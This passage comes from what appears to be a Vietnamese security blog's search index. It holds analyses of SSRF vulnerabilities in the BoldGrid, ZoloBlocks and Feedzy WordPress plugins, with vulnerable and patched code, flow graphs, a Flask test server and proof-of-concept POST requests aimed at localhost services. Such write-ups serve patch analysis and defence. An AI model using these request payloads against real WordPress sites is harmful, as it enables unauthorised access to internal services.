POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Embed Any Document Plugin \u003c= 2.7.5 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin.","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Server-Side Request Forgery (SSRF) trong plugin BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor cho phép kẻ tấn công thực hiện yêu cầu giả mạo từ phía máy chủ. Vấn đề này ảnh hưởng đến plugin Post and Page Builder by BoldGrid – Visual Drag and Drop Editor từ phiên bản chưa xác định cho đến 1.27.8. CVE ID: CVE-2025-52713 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.27.8 Patched Versions: 1.27.9 CVSS severity: Low (6.4) Required Privilege: Contributor Product: WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Post and Page Builder by BoldGrid – Visual Drag and Drop Editor: 1.27.8 (vulnerable) và 1.27.9 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rpublic function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_remote_head( $url ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } Trong phiên bản lỗi, hàm get_redirect_url() nhận mảng URL từ $_POST['urls'], sau đó duyệt qua từng phần tử và gửi request bằng wp_remote_head($url) mà không hề kiểm tra hoặc lọc dữ liệu đầu vào. Việc này cho phép kẻ tấn công tự cung cấp URL tùy ý để máy chủ gửi yêu cầu tới các địa chỉ nội bộ như 127.0.0.1 hoặc 169.254.169.254, dẫn đến lỗ hổng SSRF. Ngoài ra, do không giới hạn timeout hay số lần redirection, hàm còn có thể bị lợi dụng để gây treo hoặc tấn công từ chối dịch vụ (DoS). public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_safe_remote_head( esc_url_raw( $url ), array( 'timeout' =\u003e 5, 'redirection' =\u003e 5, ) ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } Bản vá đã thay wp_remote_head() bằng wp_safe_remote_head() kết hợp với esc_url_raw() để lọc và chỉ cho phép URL hợp lệ, đồng thời bổ sung các tham số bảo vệ như timeout =\u003e 5 và redirection =\u003e 5. Nhờ đó, hàm chỉ gửi request đến các host an toàn, ngăn SSRF và hạn chế các rủi ro về hiệu năng. ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rHàm self::validate_nonce( 'image' ); trong đoạn mã được gọi để xác thực nonce — một cơ chế bảo vệ của WordPress nhằm ngăn CSRF (Cross-Site Request Forgery). public static function validate_nonce( $name ) { $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ? $_POST[ self::$nonces[ $name ] ] : null; $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] ); if ( ! $valid ) { status_header( 401 ); wp_send_json_error(); } } Cụ thể, plugin định nghĩa một mảng tĩnh $nonces chứa các tên nonce tương ứng với từng hành động: protected static $nonces = array( 'image' =\u003e 'boldgrid_gridblock_image_ajax_nonce', 'setup' =\u003e 'boldgrid_editor_setup', 'gridblock_save' =\u003e 'boldgrid_editor_gridblock_save', ); Khi hàm validate_nonce('image') được gọi, nó sẽ: Lấy giá trị nonce từ request POST theo key boldgrid_gridblock_image_ajax_nonce. Kiểm tra giá trị này bằng wp_verify_nonce(). Nếu nonce không hợp lệ (nghĩa là request không được khởi tạo từ trang WordPress hợp pháp), hàm sẽ trả về HTTP 401 Unauthorized và dừng xử lý thông qua wp_send_json_error(). Mẹo\rKhi tìm kiếm từ khóa boldgrid_gridblock_image_ajax_nonce trong mã nguồn plugin, ta thấy giá trị này được gán từ biến JavaScript BoldgridEditor.grid_block_nonce. Giá trị của nonce trong JS\rDo đây là yêu cầu AJAX được gửi từ phía client, nên để lấy nonce hiện tại, ta có thể mở Console trên trình duyệt và gọi: BoldgridEditor.grid_block_nonce khi tạo post bằng plugin này. Giá trị của nonce trong console\rget_redirect_url() được đăng ký làm callback cho action hook: add_action( 'wp_ajax_boldgrid_redirect_url', array( $boldgrid_editor_ajax, 'get_redirect_url' ) ); Điều này có nghĩa là: Khi client gửi request AJAX đến endpoint /wp-admin/admin-ajax.php?action=boldgrid_redirect_url thì get_redirect_url() sẽ được gọi ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url → get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ← SSRF sink\"]\rF --\u003e G[\"extract headers['location'] → $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rGửi POST request với URL trỏ đến local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0 ... action=boldgrid_redirect_url\u0026urls[0]=http://localhost:8001/metadata\u0026boldgrid_gridblock_image_ajax_nonce=482dbb1ed2 Result: Nội dung đọc được từ local service\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-52713 xuất phát từ việc hàm get_redirect_url() trong plugin BoldGrid Post and Page Builder (≤ 1.27.8) gửi yêu cầu HTTP đến URL do người dùng cung cấp mà không kiểm tra hoặc giới hạn, dẫn đến SSRF. Kẻ tấn công có quyền Contributor cùng nonce hợp lệ có thể buộc máy chủ gửi request đến các địa chỉ nội bộ. Bản vá (1.27.9) khắc phục bằng cách dùng esc_url_raw() và wp_safe_remote_head() với giới hạn timeout và redirection, ngăn chặn yêu cầu nguy hiểm. ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rNguyên nhân: thiếu xác thực và lọc đầu vào URL. Nonce chỉ chống CSRF, không ngăn SSRF. Mức độ ảnh hưởng: Low (6.4) nhưng có thể dẫn đến rò rỉ dữ liệu nội bộ. Cập nhật lên v1.27.9 để vá lỗi. Khi phát triển, nên luôn dùng API an toàn (wp_safe_remote_*) và lọc URL bằng esc_url_raw(). ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin \u003c= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress ZoloBlocks Plugin.","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Server-Side Request Forgery (SSRF) trong BdThemes ZoloBlocks cho phép kẻ tấn công thực hiện yêu cầu giả mạo từ phía máy chủ. Sự cố này ảnh hưởng đến các phiên bản ZoloBlocks từ không xác định cho đến 2.3.11. CVE ID: CVE-2025-60161 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.3.11 Patched Versions: 2.3.12 CVSS severity: Low (5.4) Required Privilege: Unauthenticated Product: WordPress ZoloBlocks Plugin ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - ZoloBlocks: 2.3.11 (vulnerable) và 2.3.12 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rLỗ hổng này xuất hiện trong tệp TemplatesV1.php, tuy nhiên tệp này đã bị loại bỏ trong phiên bản vá lỗi. TemplatesV1.php đã bị loại bỏ trong bản vá\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rpublic function demo_import() { // Kiểm tra tham số đầu vào từ POST if (!isset($_POST['json_file_url'])) { wp_send_json_error('No JSON file URL provided'); return; } // Lấy và làm sạch URL người dùng cung cấp $json_file_url = sanitize_text_field(wp_unslash($_POST['json_file_url'])); // Gửi yêu cầu HTTP đến URL đó $response = wp_remote_get($json_file_url, ['timeout' =\u003e 30]); // Nếu lỗi khi fetch dữ liệu, trả JSON lỗi if (is_wp_error($response)) { wp_send_json_error('Failed to fetch JSON data'); return; } // Lấy nội dung phản hồi và giải mã JSON $body = wp_remote_retrieve_body($response); $data = json_decode($body, true); $content = $data['content'] ?? ''; // Trả kết quả JSON thành công cùng nội dung import wp_send_json_success([ 'status' =\u003e 'success', 'message' =\u003e __('Pattern imported successfully!', 'zoloblocks'), 'content' =\u003e $content, ]); } Lỗi\rHàm demo_import() nhận URL từ người dùng =\u003e gửi yêu cầu HTTP (wp_remote_get) để tải dữ liệu JSON → giải mã và trả về kết quả qua wp_send_json_success(). Vì không kiểm tra hoặc giới hạn URL, nên có thể bị lợi dụng gây SSRF.\rHàm demo_import() được đăng kí làm callback cho action hook: add_action('wp_ajax_nopriv_zolo_demo_import', [$this, 'demo_import']); Điều này có nghĩa là: Hook wp_ajax_nopriv_ được sử dụng cho người dùng chưa đăng nhập (anonymous users). Khi client gửi request AJAX đến endpoint /wp-admin/admin-ajax.php?action=zolo_demo_import, WordPress sẽ gọi hàm demo_import(). ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) → extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rGửi POST request với URL trỏ đến local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=zolo_demo_import\u0026json_file_url=http://127.0.0.1:8001/metadata Result: Nội dung đọc được từ local service\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-60161 là một SSRF trong demo_import() của ZoloBlocks (≤ 2.3.11) do nhận URL từ người dùng và gọi wp_remote_get() mà không kiểm tra. Endpoint cho phép truy cập không xác thực (wp_ajax_nopriv_...). Vấn đề đã được vá trong 2.3.12. ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rNguyên nhân: không validate/whitelist URL trước khi wp_remote_get(). Ảnh hưởng: site chạy ZoloBlocks ≤ 2.3.11; attacker có thể truy vấn dịch vụ nội bộ (SSRF). Khắc phục nhanh: cập nhật lên 2.3.12 hoặc chặn endpoint zolo_demo_import. Phòng ngừa: whitelist/validate URL, giới hạn egress, bảo vệ AJAX bằng nonce/quyền. ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress ZoloBlocks Plugin \u003c= 2.3.11 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Feedzy Plugin.","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin RSS Aggregator của Feedzy – Feed to Post, Autoblogging, News \u0026 YouTube Video Feeds Aggregator cho WordPress bị lỗ hổng Server-Side Request Forgery trong tất cả các phiên bản đến và bao gồm 5.1.0 thông qua hàm 'feedzy_sanitize_feeds'. Điều này cho phép kẻ tấn công đã xác thực, với quyền truy cập ở mức Subscriber trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-11128 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.1.0 Patched Versions: 5.1.1 CVSS severity: Low (5) Required Privilege: Subscriber Product: WordPress Feedzy Plugin ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Feedzy: 5.1.0 (vulnerable) và 5.1.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rPlugin Feedzy RSS Aggregator đã đăng ký một REST API endpoint tại /feedzy/v1/feed/, cho phép người dùng gửi URL để lấy dữ liệu feed. Tuy nhiên, trong phiên bản 5.1.0, endpoint này được bảo vệ lỏng lẻo và cơ chế lọc URL không an toàn, dẫn đến lỗ hổng SSRF (Server-Side Request Forgery). ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rpublic function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function () { return is_user_logged_in(); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = esc_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { $feeds[] = esc_url( $item ); } return $feeds; } } Trong phiên bản lỗi: Endpoint chỉ kiểm tra is_user_logged_in(), tức là bất kỳ tài khoản đã đăng nhập nào (kể cả Subscriber) đều có thể gửi request. Hàm feedzy_sanitize_feeds() chỉ sử dụng esc_url() - hàm này chỉ làm sạch chuỗi URL để hiển thị, không xác thực tính hợp lệ hay giới hạn truy cập nội bộ. Lỗi\rDo đó, attacker có thể gửi payload url=http://localhost:8001/admin để ép server gửi request đến dịch vụ nội bộ → SSRF.\rpublic function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function ( WP_REST_Request $request ) { $post_id = absint( $request-\u003eget_param( 'postId' ) ); return current_user_can( 'edit_post', $post_id ); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = wp_http_validate_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { if ( wp_http_validate_url( $item ) ) { $feeds[] = esc_url_raw( $item ); } } return $feeds; } } Bản vá đã: Giới hạn quyền truy cập REST API bằng current_user_can( 'edit_post', $post_id ), chỉ cho phép Editor hoặc Admin có quyền gọi endpoint. Thay thế esc_url() bằng wp_http_validate_url(), đảm bảo URL hợp lệ, chỉ chấp nhận giao thức http/https, và loại bỏ địa chỉ nội bộ (loopback, localhost, 127.0.0.1...). Sử dụng esc_url_raw() để lưu URL an toàn mà không tự động mã hóa lại. Thông tin\rHàm count() trong feedzy_sanitize_feeds() yêu cầu tham số đầu vào phải thuộc kiểu Countable hoặc array. Nếu truyền vào một string, PHP sẽ ném lỗi: Lỗi\rException has occurred. TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given\rVì 